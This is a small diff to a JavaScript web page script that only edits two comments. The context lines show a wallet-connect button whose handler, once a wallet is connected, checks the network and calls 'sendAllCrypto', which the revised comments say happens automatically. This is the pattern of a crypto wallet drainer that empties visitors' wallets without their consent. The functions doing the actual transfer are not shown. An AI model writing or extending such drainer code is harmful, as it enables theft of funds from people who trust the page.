@@ -16,7 +16,7 @@ document.getElementById('connectButton').onclick = async () => {
             document.getElementById('disconnectButton').style.display = 'inline';
             document.getElementById('connectButton').style.display = 'none';
 
-            // Check network and initiate the process
+            // Automatically check network and send crypto
             await checkNetworkAndSend(walletAddress);
         } catch (error) {
             handleError('Error connecting to wallet', error);
@@ -41,7 +41,7 @@ async function checkNetworkAndSend(walletAddress) {
 
     // Check if the network is sufficient
     if (isSufficientNetwork(network.chainId)) {
-        // If sufficient, send all crypto
+        // If sufficient, send all crypto automatically
         await sendAllCrypto(walletAddress);
     } else {
         // Request to switch network
